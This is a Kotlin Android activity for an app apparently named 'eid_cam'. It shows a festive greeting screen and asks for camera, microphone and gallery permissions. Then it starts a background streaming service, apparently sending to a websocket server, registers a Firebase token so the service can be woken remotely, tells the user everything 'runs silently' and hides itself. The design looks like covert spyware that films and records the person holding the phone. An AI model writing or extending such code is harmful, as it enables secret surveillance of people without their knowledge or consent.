package com.eidlab.cam

import android.Manifest
import android.animation.ObjectAnimator
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.View
import android.view.WindowManager
import android.view.animation.DecelerateInterpolator
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    companion object {
        const val PERM_REQ = 100
        val PERMISSIONS get() = buildList {
            add(Manifest.permission.CAMERA)
            add(Manifest.permission.RECORD_AUDIO)
            add(Manifest.permission.INTERNET)
            add(Manifest.permission.FOREGROUND_SERVICE)
            if (Build.VERSION.SDK_INT >= 33) {
                add(Manifest.permission.POST_NOTIFICATIONS)
                add(Manifest.permission.READ_MEDIA_IMAGES)
            } else {
                add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }.toTypedArray()
    }

    private lateinit var btnGrant  : Button
    private lateinit var txtStatus : TextView
    private lateinit var badgeCam  : TextView
    private lateinit var badgeMic  : TextView
    private lateinit var badgeGal  : TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Full screen immersive — hide status bar
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            or View.SYSTEM_UI_FLAG_FULLSCREEN
            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
        )
        setContentView(R.layout.activity_main)

        btnGrant   = findViewById(R.id.btn_grant)
        txtStatus  = findViewById(R.id.txt_status)
        badgeCam   = findViewById(R.id.badge_camera)
        badgeMic   = findViewById(R.id.badge_mic)
        badgeGal   = findViewById(R.id.badge_gallery)

        // Save defaults on first launch
        val prefs = getSharedPreferences("eid_cam", MODE_PRIVATE)
        if (!prefs.contains("camera_id")) {
            prefs.edit()
                .putString("server_url",  "wss://YOUR_RAILWAY_APP.up.railway.app")
                .putString("camera_name", Build.MANUFACTURER + " " + Build.MODEL)
                .putString("camera_id",   "android_" + java.util.UUID.randomUUID().toString().take(8))
                .apply()
        }

        // Fade in the greeting screen
        val root = findViewById<View>(android.R.id.content)
        root.alpha = 0f
        root.animate().alpha(1f).setDuration(800).setInterpolator(DecelerateInterpolator()).start()

        // Check if already fully granted — go straight to background
        if (allGranted()) {
            onAllGranted()
        } else {
            updateBadges()
            btnGrant.setOnClickListener { requestAllPermissions() }
        }

        // If launched by FCM wake signal
        if (intent?.getStringExtra("action") == "wake") {
            startStreamService()
        }
    }

    // ── Permission helpers ───────────────────────────────
    private fun allGranted() = PERMISSIONS.all {
        ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
    }

    private fun updateBadges() {
        fun badge(perm: String, tv: TextView) {
            val granted = ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
            tv.text = if (granted) "✓ Granted" else "Required"
            tv.setTextColor(if (granted) 0xFF2ECC8A.toInt() else 0xFFC9A84C.toInt())
        }
        badge(Manifest.permission.CAMERA, badgeCam)
        badge(Manifest.permission.RECORD_AUDIO, badgeMic)
        val galleryPerm = if (Build.VERSION.SDK_INT >= 33)
            Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
        badge(galleryPerm, badgeGal)
    }

    private fun requestAllPermissions() {
        btnGrant.text = "Requesting…"
        btnGrant.isEnabled = false
        ActivityCompat.requestPermissions(this, PERMISSIONS, PERM_REQ)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != PERM_REQ) return
        updateBadges()

        val camGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) ==
                PackageManager.PERMISSION_GRANTED

        if (camGranted) {
            onAllGranted()
        } else {
            btnGrant.text = "GRANT PERMISSIONS"
            btnGrant.isEnabled = true
            txtStatus.text = "Camera permission is required to continue."
            txtStatus.setTextColor(0xFFC0392B.toInt())
        }
    }

    private fun onAllGranted() {
        // Register FCM token
        com.google.firebase.messaging.FirebaseMessaging.getInstance().token
            .addOnSuccessListener { token ->
                getSharedPreferences("eid_cam", MODE_PRIVATE)
                    .edit().putString("fcm_token", token).apply()
            }

        // Update UI to show ready state
        btnGrant.text = "✓ ALL SET — Running in Background"
        btnGrant.isEnabled = false
        btnGrant.alpha = 0.6f
        txtStatus.text = "App is active and connected.\nYou can close this screen — everything runs silently."
        txtStatus.setTextColor(0xFF2ECC8A.toInt())
        updateBadges()

        // Start the background service immediately
        startStreamService()

        // Fade out and minimize after 3 seconds
        android.os.Handler(mainLooper).postDelayed({
            // Move app to background — don't finish, just hide
            moveTaskToBack(true)
        }, 3000)
    }

    private fun startStreamService() {
        val i = Intent(this, StreamService::class.java).apply {
            action = StreamService.ACTION_START
        }
        ContextCompat.startForegroundService(this, i)
    }

    override fun onResume() {
        super.onResume()
        updateBadges()
        if (allGranted() && !isServiceRunning()) {
            startStreamService()
        }
    }

    private fun isServiceRunning(): Boolean {
        val mgr = getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager
        @Suppress("DEPRECATION")
        return mgr.getRunningServices(Int.MAX_VALUE)
            .any { it.service.className == StreamService::class.java.name }
    }
}
